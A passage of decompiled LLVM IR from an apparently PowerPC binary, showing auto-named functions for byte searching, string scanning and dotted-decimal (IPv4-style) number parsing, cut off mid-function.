  %v2_1000a57c = load i8, i8* %v1_1000a57c, align 1
  %v3_1000a57c = zext i8 %v2_1000a57c to i32
  %v4_1000a580 = icmp eq i32 %v3_1000a57c, %v1_1000a580
  %v0_1000a584 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000a580, i32 %v0_1000a584)
  %v0_1000a588 = load i32, i32* @r3, align 4
  %v1_1000a588 = add i32 %v0_1000a588, 1
  store i32 %v1_1000a588, i32* @r3, align 4
  %v0_1000a58c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a58c = add i32 %v0_1000a58c, -1
  store i32 %v1_1000a58c, i32* %ctr.global-to-local, align 4
  %v2_1000a58c = icmp eq i32 %v1_1000a58c, 0
  br i1 %v2_1000a58c, label %dec_label_pc_1000a590, label %dec_label_pc_1000a57c.dec_label_pc_1000a57c_crit_edge

dec_label_pc_1000a57c.dec_label_pc_1000a57c_crit_edge: ; preds = %dec_label_pc_1000a57c
  %v1_1000a580.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000a57c

dec_label_pc_1000a590:                            ; preds = %dec_label_pc_1000a57c, %dec_label_pc_1000a570
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1000a58c, { 1, 0 }
  uselistorder i32 %v1_1000a588, { 1, 0 }
  uselistorder i32 %v0_1000a570, { 1, 2, 0 }
  uselistorder i32 %v1_1000a56c, { 2, 1, 0 }
  uselistorder i32 %v1_1000a4f0, { 0, 2, 1 }
  uselistorder i32 %v1_1000a4ec, { 0, 2, 1 }
  uselistorder i32 %v0_1000a528, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v2_1000a4cc, { 1, 0 }
  uselistorder i32 %v1_1000a4c0, { 1, 0 }
  uselistorder i32 %v0_1000a4e816, { 1, 0 }
  uselistorder i32 %v0_1000a4c0, { 3, 2, 0, 1 }
  uselistorder i32 %v0_1000a4c4, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 %v1_1000a4b8, { 1, 0 }
  uselistorder i32 %v1_1000a4b0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1000a4b47, { 2, 0, 1 }
  uselistorder i32 %v1_1000a494, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 5, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %ctr.global-to-local, { 4, 3, 0, 5, 1, 7, 6, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000a57c, { 1, 0 }
  uselistorder label %dec_label_pc_1000a56c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1000a4e8, { 1, 0 }
  uselistorder label %dec_label_pc_1000a4bc, { 1, 0 }
}

define i32 @function_1000a598(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_1000a598:
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 268477876, i32* @lr, align 4
  %v0_1000a5b0 = call i32 @function_10006d88()
  %v0_1000a5b8 = load i32, i32* @r28, align 4
  %v1_1000a5b8 = load i32, i32* @r29, align 4
  %v2_1000a5b8 = add i32 %v1_1000a5b8, %v0_1000a5b8
  ret i32 %v2_1000a5b8
}

define i32 @function_1000a5cc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000a5cc:
  %ctr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v1_1000a5d0 = urem i32 %arg2, 256
  store i32 %v1_1000a5d0, i32* %r4.global-to-local, align 4
  %v2_1000a5d8 = add i32 %arg3, %arg1
  store i32 %v2_1000a5d8, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %ctr.global-to-local, align 4
  %v2_1000a5f413 = icmp eq i32 %arg3, 0
  br i1 %v2_1000a5f413, label %dec_label_pc_1000a5fc, label %dec_label_pc_1000a5f8

dec_label_pc_1000a5e0:                            ; preds = %dec_label_pc_1000a5f8
  %v1_1000a5e0 = add i32 %v0_1000a5e0, -1
  %v2_1000a5e0 = inttoptr i32 %v1_1000a5e0 to i8*
  %v3_1000a5e0 = load i8, i8* %v2_1000a5e0, align 1
  %v4_1000a5e0 = zext i8 %v3_1000a5e0 to i32
  store i32 %v1_1000a5e0, i32* %r3.global-to-local, align 4
  %v0_1000a5e4 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000a5e4 = add i32 %v0_1000a5e4, -1
  store i32 %v1_1000a5e4, i32* %r5.global-to-local, align 4
  %v1_1000a5e8 = load i32, i32* %r4.global-to-local, align 4
  %v4_1000a5e8 = icmp eq i32 %v4_1000a5e0, %v1_1000a5e8
  %v0_1000a5ec = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000a5e8, i32 %v0_1000a5ec)
  %v0_1000a5f0 = load i32, i32* %r3.global-to-local, align 4
  %v0_1000a5f4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a5f4 = add i32 %v0_1000a5f4, -1
  store i32 %v1_1000a5f4, i32* %ctr.global-to-local, align 4
  %v2_1000a5f4 = icmp eq i32 %v1_1000a5f4, 0
  br i1 %v2_1000a5f4, label %dec_label_pc_1000a5fc.loopexit, label %dec_label_pc_1000a5f8

dec_label_pc_1000a5f8:                            ; preds = %dec_label_pc_1000a5cc, %dec_label_pc_1000a5e0
  %v0_1000a5e0 = phi i32 [ %v0_1000a5f0, %dec_label_pc_1000a5e0 ], [ %v2_1000a5d8, %dec_label_pc_1000a5cc ]
  %v0_1000a5f8.in.in = phi i32 [ %v0_1000a5f0, %dec_label_pc_1000a5e0 ], [ %v2_1000a5d8, %dec_label_pc_1000a5cc ]
  %v0_1000a5f8.in = urem i32 %v0_1000a5f8.in.in, 4
  %v0_1000a5f8 = icmp eq i32 %v0_1000a5f8.in, 0
  br i1 %v0_1000a5f8, label %dec_label_pc_1000a5fc.loopexit, label %dec_label_pc_1000a5e0

dec_label_pc_1000a5fc.loopexit:                   ; preds = %dec_label_pc_1000a5f8, %dec_label_pc_1000a5e0
  %v0_1000a62416.ph = phi i32 [ %v0_1000a5f0, %dec_label_pc_1000a5e0 ], [ %v0_1000a5e0, %dec_label_pc_1000a5f8 ]
  %v0_1000a5fc.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_1000a600.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000a5fc

dec_label_pc_1000a5fc:                            ; preds = %dec_label_pc_1000a5fc.loopexit, %dec_label_pc_1000a5cc
  %v0_1000a600 = phi i32 [ %v1_1000a5d0, %dec_label_pc_1000a5cc ], [ %v0_1000a600.pre, %dec_label_pc_1000a5fc.loopexit ]
  %v0_1000a5fc = phi i32 [ 0, %dec_label_pc_1000a5cc ], [ %v0_1000a5fc.pre, %dec_label_pc_1000a5fc.loopexit ]
  %v0_1000a62416 = phi i32 [ %v2_1000a5d8, %dec_label_pc_1000a5cc ], [ %v0_1000a62416.ph, %dec_label_pc_1000a5fc.loopexit ]
  %v1_1000a5fc = udiv i32 %v0_1000a5fc, 4
  %v1_1000a600 = mul i32 %v0_1000a600, 256
  %v2_1000a608 = or i32 %v1_1000a600, %v0_1000a600
  %v1_1000a610 = mul i32 %v2_1000a608, 65536
  %v2_1000a618 = or i32 %v1_1000a610, %v2_1000a608
  store i32 %v2_1000a618, i32* %r7.global-to-local, align 4
  store i32 -2130640640, i32* %r8.global-to-local, align 4
  store i32 %v1_1000a5fc, i32* %ctr.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1000a5fc, 4
  br i1 %tmp, label %dec_label_pc_1000a69c, label %dec_label_pc_1000a624

dec_label_pc_1000a624:                            ; preds = %dec_label_pc_1000a5fc, %dec_label_pc_1000a698.backedge.dec_label_pc_1000a624_crit_edge
  %v0_1000a69821 = phi i32 [ %v1_1000a698, %dec_label_pc_1000a698.backedge.dec_label_pc_1000a624_crit_edge ], [ %v1_1000a5fc, %dec_label_pc_1000a5fc ]
  %v0_1000a640 = phi i32 [ %v0_1000a640.pre, %dec_label_pc_1000a698.backedge.dec_label_pc_1000a624_crit_edge ], [ -2130640640, %dec_label_pc_1000a5fc ]
  %v0_1000a62c = phi i32 [ %v0_1000a62c.pre, %dec_label_pc_1000a698.backedge.dec_label_pc_1000a624_crit_edge ], [ %v2_1000a618, %dec_label_pc_1000a5fc ]
  %v0_1000a628 = phi i32 [ %v0_1000a628.pre, %dec_label_pc_1000a698.backedge.dec_label_pc_1000a624_crit_edge ], [ %v0_1000a5fc, %dec_label_pc_1000a5fc ]
  %v0_1000a624 = phi i32 [ %v0_1000a624.pre, %dec_label_pc_1000a698.backedge.dec_label_pc_1000a624_crit_edge ], [ %v0_1000a62416, %dec_label_pc_1000a5fc ]
  %v1_1000a624 = add i32 %v0_1000a624, -4
  %v2_1000a624 = inttoptr i32 %v1_1000a624 to i32*
  %v3_1000a624 = load i32, i32* %v2_1000a624, align 4
  store i32 %v1_1000a624, i32* %r3.global-to-local, align 4
  %v1_1000a628 = add i32 %v0_1000a628, -4
  store i32 %v1_1000a628, i32* %r5.global-to-local, align 4
  %v2_1000a62c = xor i32 %v3_1000a624, %v0_1000a62c
  %v1_1000a634 = add i32 %v2_1000a62c, 2130640639
  %v2_1000a638 = xor i32 %v1_1000a634, %v2_1000a62c
  %v1_1000a63c = add i32 %v0_1000a624, -1
  %v2_1000a640 = sub i32 -1, %v2_1000a638
  %v3_1000a640 = and i32 %v0_1000a640, %v2_1000a640
  %v6_1000a640 = icmp eq i32 %v3_1000a640, 0
  br i1 %v6_1000a640, label %dec_label_pc_1000a698.backedge, label %dec_label_pc_1000a648

dec_label_pc_1000a648:                            ; preds = %dec_label_pc_1000a624
  %v2_1000a648 = inttoptr i32 %v1_1000a63c to i8*
  %v3_1000a648 = load i8, i8* %v2_1000a648, align 1
  %v4_1000a648 = zext i8 %v3_1000a648 to i32
  %v1_1000a64c = add i32 %v0_1000a624, -2
  %v1_1000a650 = add i32 %v0_1000a624, -3
  %v1_1000a654 = load i32, i32* %r4.global-to-local, align 4
  %v4_1000a654 = icmp eq i32 %v4_1000a648, %v1_1000a654
  br i1 %v4_1000a654, label %dec_label_pc_1000a65c, label %dec_label_pc_1000a664

dec_label_pc_1000a65c:                            ; preds = %dec_label_pc_1000a648
  store i32 %v1_1000a63c, i32* %r3.global-to-local, align 4
  ret i32 %v1_1000a63c

dec_label_pc_1000a664:                            ; preds = %dec_label_pc_1000a648
  %v2_1000a664 = inttoptr i32 %v1_1000a64c to i8*
  %v3_1000a664 = load i8, i8* %v2_1000a664, align 1
  %v4_1000a664 = zext i8 %v3_1000a664 to i32
  %v4_1000a668 = icmp eq i32 %v4_1000a664, %v1_1000a654
  br i1 %v4_1000a668, label %dec_label_pc_1000a670, label %dec_label_pc_1000a678

dec_label_pc_1000a670:                            ; preds = %dec_label_pc_1000a664
  store i32 %v1_1000a64c, i32* %r3.global-to-local, align 4
  ret i32 %v1_1000a64c

dec_label_pc_1000a678:                            ; preds = %dec_label_pc_1000a664
  %v2_1000a678 = inttoptr i32 %v1_1000a650 to i8*
  %v3_1000a678 = load i8, i8* %v2_1000a678, align 1
  %v4_1000a678 = zext i8 %v3_1000a678 to i32
  %v4_1000a67c = icmp eq i32 %v4_1000a678, %v1_1000a654
  br i1 %v4_1000a67c, label %dec_label_pc_1000a684, label %dec_label_pc_1000a68c

dec_label_pc_1000a684:                            ; preds = %dec_label_pc_1000a678
  store i32 %v1_1000a650, i32* %r3.global-to-local, align 4
  ret i32 %v1_1000a650

dec_label_pc_1000a68c:                            ; preds = %dec_label_pc_1000a678
  %v1_1000a68c = inttoptr i32 %v1_1000a624 to i8*
  %v2_1000a68c = load i8, i8* %v1_1000a68c, align 1
  %v3_1000a68c = zext i8 %v2_1000a68c to i32
  %v4_1000a690 = icmp eq i32 %v3_1000a68c, %v1_1000a654
  %v0_1000a694 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000a690, i32 %v0_1000a694)
  %v0_1000a698.pre = load i32, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000a698.backedge

dec_label_pc_1000a698.backedge:                   ; preds = %dec_label_pc_1000a68c, %dec_label_pc_1000a624
  %v0_1000a698 = phi i32 [ %v0_1000a698.pre, %dec_label_pc_1000a68c ], [ %v0_1000a69821, %dec_label_pc_1000a624 ]
  %v1_1000a698 = add i32 %v0_1000a698, -1
  store i32 %v1_1000a698, i32* %ctr.global-to-local, align 4
  %v2_1000a698 = icmp eq i32 %v1_1000a698, 0
  br i1 %v2_1000a698, label %dec_label_pc_1000a698.dec_label_pc_1000a69c_crit_edge, label %dec_label_pc_1000a698.backedge.dec_label_pc_1000a624_crit_edge

dec_label_pc_1000a698.backedge.dec_label_pc_1000a624_crit_edge: ; preds = %dec_label_pc_1000a698.backedge
  %v0_1000a624.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_1000a628.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_1000a62c.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_1000a640.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000a624

dec_label_pc_1000a698.dec_label_pc_1000a69c_crit_edge: ; preds = %dec_label_pc_1000a698.backedge
  %v0_1000a69c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000a69c

dec_label_pc_1000a69c:                            ; preds = %dec_label_pc_1000a698.dec_label_pc_1000a69c_crit_edge, %dec_label_pc_1000a5fc
  %v0_1000a69c = phi i32 [ %v0_1000a69c.pre, %dec_label_pc_1000a698.dec_label_pc_1000a69c_crit_edge ], [ %v0_1000a5fc, %dec_label_pc_1000a5fc ]
  %v1_1000a69c = add i32 %v0_1000a69c, 1
  store i32 %v1_1000a69c, i32* %r5.global-to-local, align 4
  store i32 %v0_1000a69c, i32* %ctr.global-to-local, align 4
  %v2_1000a6b43 = icmp eq i32 %v0_1000a69c, 0
  br i1 %v2_1000a6b43, label %dec_label_pc_1000a6b8, label %dec_label_pc_1000a6a8

dec_label_pc_1000a6a8:                            ; preds = %dec_label_pc_1000a69c, %dec_label_pc_1000a6a8
  %v0_1000a6a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000a6a8 = add i32 %v0_1000a6a8, -1
  %v2_1000a6a8 = inttoptr i32 %v1_1000a6a8 to i8*
  %v3_1000a6a8 = load i8, i8* %v2_1000a6a8, align 1
  %v4_1000a6a8 = zext i8 %v3_1000a6a8 to i32
  store i32 %v1_1000a6a8, i32* %r3.global-to-local, align 4
  %v1_1000a6ac = load i32, i32* %r4.global-to-local, align 4
  %v4_1000a6ac = icmp eq i32 %v4_1000a6a8, %v1_1000a6ac
  %v0_1000a6b0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000a6ac, i32 %v0_1000a6b0)
  %v0_1000a6b4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a6b4 = add i32 %v0_1000a6b4, -1
  store i32 %v1_1000a6b4, i32* %ctr.global-to-local, align 4
  %v2_1000a6b4 = icmp eq i32 %v1_1000a6b4, 0
  br i1 %v2_1000a6b4, label %dec_label_pc_1000a6b8, label %dec_label_pc_1000a6a8

dec_label_pc_1000a6b8:                            ; preds = %dec_label_pc_1000a6a8, %dec_label_pc_1000a69c
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1000a6b4, { 1, 0 }
  uselistorder i32 %v0_1000a69c, { 1, 2, 0 }
  uselistorder i32 %v1_1000a698, { 2, 1, 0 }
  uselistorder i32 %v1_1000a650, { 1, 0, 2 }
  uselistorder i32 %v1_1000a64c, { 1, 0, 2 }
  uselistorder i32 %v1_1000a63c, { 1, 0, 2 }
  uselistorder i32 %v2_1000a608, { 1, 0 }
  uselistorder i32 %v1_1000a5fc, { 1, 0 }
  uselistorder i32 %v0_1000a5fc, { 3, 2, 0, 1 }
  uselistorder i32 %v0_1000a600, { 1, 0 }
  uselistorder i32 %v1_1000a5f4, { 1, 0 }
  uselistorder i32 %v0_1000a5f0, { 1, 0, 2 }
  uselistorder i32 %v2_1000a5d8, { 2, 0, 1, 3 }
  uselistorder i32 %v1_1000a5d0, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 9, 5, 2, 3, 4, 6, 7, 8, 10 }
  uselistorder i32* %ctr.global-to-local, { 4, 3, 0, 6, 5, 1, 8, 7, 2 }
  uselistorder i32 %arg3, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1000a6a8, { 1, 0 }
  uselistorder label %dec_label_pc_1000a624, { 1, 0 }
  uselistorder label %dec_label_pc_1000a5f8, { 1, 0 }
}

define i32 @function_1000a6c0(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000a6c0:
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  %v3_1000a6cc = icmp eq i32 %arg1, 0
  %v0_1000a6d4 = load i32, i32* @r5, align 4
  store i32 %v0_1000a6d4, i32* %r30.global-to-local, align 4
  %v0_1000a6d8 = load i32, i32* @r4, align 4
  store i32 %v0_1000a6d8, i32* %r29.global-to-local, align 4
  br i1 %v3_1000a6cc, label %dec_label_pc_1000a6e0, label %dec_label_pc_1000a6e4

dec_label_pc_1000a6e0:                            ; preds = %dec_label_pc_1000a6c0
  %v1_1000a6e0 = inttoptr i32 %v0_1000a6d4 to i32*
  %v2_1000a6e0 = load i32, i32* %v1_1000a6e0, align 4
  store i32 %v2_1000a6e0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000a6e4

dec_label_pc_1000a6e4:                            ; preds = %dec_label_pc_1000a6c0, %dec_label_pc_1000a6e0
  %v0_1000a6e4 = phi i32 [ %arg1, %dec_label_pc_1000a6c0 ], [ %v2_1000a6e0, %dec_label_pc_1000a6e0 ]
  store i32 %v0_1000a6e4, i32* @r3, align 4
  %v1_1000a6e8 = inttoptr i32 %v0_1000a6e4 to i8*
  %v2_1000a6e8 = call i32 @function_1000bb98(i8* %v1_1000a6e8)
  %v0_1000a6ec = load i32, i32* %r29.global-to-local, align 4
  %v0_1000a6f0 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000a6f0 = add i32 %v0_1000a6f0, %v2_1000a6e8
  %v3_1000a6f0 = inttoptr i32 %v2_1000a6f0 to i8*
  %v4_1000a6f0 = load i8, i8* %v3_1000a6f0, align 1
  store i32 %v2_1000a6f0, i32* @r31, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 %v2_1000a6f0, i32* @r3, align 4
  %v3_1000a700 = icmp eq i8 %v4_1000a6f0, 0
  br i1 %v3_1000a700, label %dec_label_pc_1000a708, label %dec_label_pc_1000a710

dec_label_pc_1000a708:                            ; preds = %dec_label_pc_1000a6e4
  %v1_1000a708 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000a708 = inttoptr i32 %v1_1000a708 to i32*
  store i32 %v2_1000a6f0, i32* %v2_1000a708, align 4
  br label %dec_label_pc_1000a748

dec_label_pc_1000a710:                            ; preds = %dec_label_pc_1000a6e4
  store i32 268478228, i32* @lr, align 4
  %v4_1000a710 = call i32 @function_1000a760(i8* %v3_1000a6f0, i32 %v0_1000a6ec, i32 0)
  store i32 %v4_1000a710, i32* %r9.global-to-local, align 4
  %v4_1000a718 = icmp eq i32 %v4_1000a710, 0
  %v0_1000a71c = load i32, i32* @r31, align 4
  store i32 %v0_1000a71c, i32* @r3, align 4
  %v2_1000a720 = add i32 %v4_1000a710, 1
  store i32 %v2_1000a720, i32* %r11.global-to-local, align 4
  br i1 %v4_1000a718, label %dec_label_pc_1000a728, label %dec_label_pc_1000a738

dec_label_pc_1000a728:                            ; preds = %dec_label_pc_1000a710
  store i32 268478252, i32* @lr, align 4
  %v4_1000a728 = call i32 @function_1000b9dc(i32 %v0_1000a71c, i32 0, i32 0)
  %v0_1000a72c = load i32, i32* @r31, align 4
  store i32 %v0_1000a72c, i32* %r9.global-to-local, align 4
  %v1_1000a730 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000a730 = inttoptr i32 %v1_1000a730 to i32*
  store i32 %v4_1000a728, i32* %v2_1000a730, align 4
  br label %dec_label_pc_1000a748

dec_label_pc_1000a738:                            ; preds = %dec_label_pc_1000a710
  %v1_1000a718 = inttoptr i32 %v4_1000a710 to i8*
  store i8 0, i8* %v1_1000a718, align 1
  %v0_1000a740 = load i32, i32* @r31, align 4
  store i32 %v0_1000a740, i32* %r9.global-to-local, align 4
  %v0_1000a744 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a744 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000a744 = inttoptr i32 %v1_1000a744 to i32*
  store i32 %v0_1000a744, i32* %v2_1000a744, align 4
  br label %dec_label_pc_1000a748

dec_label_pc_1000a748:                            ; preds = %dec_label_pc_1000a728, %dec_label_pc_1000a708, %dec_label_pc_1000a738
  %v0_1000a74c = load i32, i32* %r9.global-to-local, align 4
  ret i32 %v0_1000a74c

; uselistorder directives
  uselistorder i32 %v4_1000a710, { 3, 0, 1, 2 }
  uselistorder i32 %v2_1000a6f0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1000a6e4, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r31.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000a748, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a6e4, { 1, 0 }
}

define i32 @function_1000a760(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000a760:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000a7801 = load i32, i32* @r3, align 4
  %v1_1000a7802 = inttoptr i32 %v0_1000a7801 to i8*
  %v2_1000a7803 = load i8, i8* %v1_1000a7802, align 1
  %v3_1000a7804 = zext i8 %v2_1000a7803 to i32
  store i32 %v3_1000a7804, i32* %r11.global-to-local, align 4
  %v3_1000a7846 = icmp eq i8 %v2_1000a7803, 0
  br i1 %v3_1000a7846, label %dec_label_pc_1000a794, label %dec_label_pc_1000a78c

dec_label_pc_1000a764:                            ; preds = %dec_label_pc_1000a768
  %v3_1000a768 = zext i8 %v2_1000a768 to i32
  %v4_1000a774 = icmp eq i32 %v3_1000a768, %v1_1000a774
  %v0_1000a764 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000a774, i32 %v0_1000a764)
  %v0_1000a768.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a774.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000a768

dec_label_pc_1000a768:                            ; preds = %dec_label_pc_1000a78c, %dec_label_pc_1000a764
  %v1_1000a774 = phi i32 [ %v1_1000a7749, %dec_label_pc_1000a78c ], [ %v1_1000a774.pre, %dec_label_pc_1000a764 ]
  %v0_1000a768 = phi i32 [ %tmp, %dec_label_pc_1000a78c ], [ %v0_1000a768.pre, %dec_label_pc_1000a764 ]
  %v1_1000a768 = inttoptr i32 %v0_1000a768 to i8*
  %v2_1000a768 = load i8, i8* %v1_1000a768, align 1
  %v1_1000a76c = add i32 %v0_1000a768, 1
  store i32 %v1_1000a76c, i32* %r9.global-to-local, align 4
  %v3_1000a770 = icmp eq i8 %v2_1000a768, 0
  br i1 %v3_1000a770, label %dec_label_pc_1000a77c, label %dec_label_pc_1000a764

dec_label_pc_1000a77c:                            ; preds = %dec_label_pc_1000a768
  %v0_1000a77c = load i32, i32* @r3, align 4
  %v1_1000a77c = add i32 %v0_1000a77c, 1
  store i32 %v1_1000a77c, i32* @r3, align 4
  %v1_1000a780 = inttoptr i32 %v1_1000a77c to i8*
  %v2_1000a780 = load i8, i8* %v1_1000a780, align 1
  %v3_1000a780 = zext i8 %v2_1000a780 to i32
  store i32 %v3_1000a780, i32* %r11.global-to-local, align 4
  %v3_1000a784 = icmp eq i8 %v2_1000a780, 0
  br i1 %v3_1000a784, label %dec_label_pc_1000a794, label %dec_label_pc_1000a78c

dec_label_pc_1000a78c:                            ; preds = %dec_label_pc_1000a760, %dec_label_pc_1000a77c
  %v1_1000a7749 = phi i32 [ %v3_1000a780, %dec_label_pc_1000a77c ], [ %v3_1000a7804, %dec_label_pc_1000a760 ]
  store i32 %tmp, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000a768

dec_label_pc_1000a794:                            ; preds = %dec_label_pc_1000a77c, %dec_label_pc_1000a760
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_1000a768, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000a78c, { 1, 0 }
}

define i32 @function_1000a79c(i8* %arg1) local_unnamed_addr {
dec_label_pc_1000a79c:
  %r5.global-to-local = alloca i32, align 4
  %v3_1000a79c = icmp eq i8* %arg1, null
  br i1 %v3_1000a79c, label %dec_label_pc_1000a854, label %dec_label_pc_1000a7a4

dec_label_pc_1000a7a4:                            ; preds = %dec_label_pc_1000a79c
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_1000a7b8.pre = load i32, i32* @global_var_1001044c, align 4
  br label %dec_label_pc_1000a7b4

dec_label_pc_1000a7b4:                            ; preds = %dec_label_pc_1000a7a4, %dec_label_pc_1000a82c
  %v0_1000a82c = phi i32 [ 0, %dec_label_pc_1000a7a4 ], [ %v2_1000a834, %dec_label_pc_1000a82c ]
  %v0_1000a830 = phi i32 [ 1, %dec_label_pc_1000a7a4 ], [ %v1_1000a830, %dec_label_pc_1000a82c ]
  %v0_1000a7b4 = phi i32 [ %tmp, %dec_label_pc_1000a7a4 ], [ %v0_1000a7b43, %dec_label_pc_1000a82c ]
  %v1_1000a7b4 = inttoptr i32 %v0_1000a7b4 to i8*
  %v2_1000a7b4 = load i8, i8* %v1_1000a7b4, align 1
  %v3_1000a7b4 = zext i8 %v2_1000a7b4 to i32
  %v1_1000a7bc = mul nuw nsw i32 %v3_1000a7b4, 2
  %v2_1000a7c0 = add i32 %v1_1000a7bc, %v3_1000a7b8.pre
  %v3_1000a7c0 = inttoptr i32 %v2_1000a7c0 to i16*
  %v4_1000a7c0 = load i16, i16* %v3_1000a7c0, align 2
  %v1_1000a7c4 = and i16 %v4_1000a7c0, 8
  %v3_1000a7c4 = icmp eq i16 %v1_1000a7c4, 0
  br i1 %v3_1000a7c4, label %dec_label_pc_1000a854, label %dec_label_pc_1000a7cc

dec_label_pc_1000a7cc:                            ; preds = %dec_label_pc_1000a7b4
  br label %dec_label_pc_1000a7e4

dec_label_pc_1000a7d4:                            ; preds = %dec_label_pc_1000a7e4
  %v1_1000a7e8 = mul i32 %v1_1000a834, 10
  %v2_1000a7f0 = add i32 %v3_1000a7e4, %v1_1000a7e8
  %v1_1000a7d4 = add i32 %v2_1000a7f0, -48
  %v1_1000a7d8 = add i32 %v0_1000a81c, 1
  %v2_1000a7dc = icmp sgt i32 %v1_1000a7d4, 255
  br i1 %v2_1000a7dc, label %dec_label_pc_1000a854, label %dec_label_pc_1000a7e4

dec_label_pc_1000a7e4:                            ; preds = %dec_label_pc_1000a7d4, %dec_label_pc_1000a7cc
  %v1_1000a834 = phi i32 [ %v1_1000a7d4, %dec_label_pc_1000a7d4 ], [ 0, %dec_label_pc_1000a7cc ]
  %v0_1000a81c = phi i32 [ %v1_1000a7d8, %dec_label_pc_1000a7d4 ], [ %v0_1000a7b4, %dec_label_pc_1000a7cc ]
  %v1_1000a7e4 = inttoptr i32 %v0_1000a81c to i8*
  %v2_1000a7e4 = load i8, i8* %v1_1000a7e4, align 1
  %v3_1000a7e4 = zext i8 %v2_1000a7e4 to i32
  %v1_1000a7ec = mul nuw nsw i32 %v3_1000a7e4, 2
  %v2_1000a7f4 = add i32 %v1_1000a7ec, %v3_1000a7b8.pre
  %v3_1000a7f4 = inttoptr i32 %v2_1000a7f4 to i16*
  %v4_1000a7f4 = load i16, i16* %v3_1000a7f4, align 2
  %v5_1000a7f4 = zext i16 %v4_1000a7f4 to i32
  %v1_1000a7f8 = and i32 %v5_1000a7f4, 8
  %v3_1000a7f8 = icmp eq i32 %v1_1000a7f8, 0
  br i1 %v3_1000a7f8, label %dec_label_pc_1000a800, label %dec_label_pc_1000a7d4

dec_label_pc_1000a800:                            ; preds = %dec_label_pc_1000a7e4
  %v2_1000a800 = icmp sgt i32 %v0_1000a830, 3
  br i1 %v2_1000a800, label %dec_label_pc_1000a818, label %dec_label_pc_1000a808

dec_label_pc_1000a808:                            ; preds = %dec_label_pc_1000a800
  %v3_1000a808 = icmp eq i8 %v2_1000a7e4, 46
  br i1 %v3_1000a808, label %dec_label_pc_1000a810, label %dec_label_pc_1000a854

dec_label_pc_1000a810:                            ; preds = %dec_label_pc_1000a808
  %v1_1000a810 = add i32 %v0_1000a81c, 1
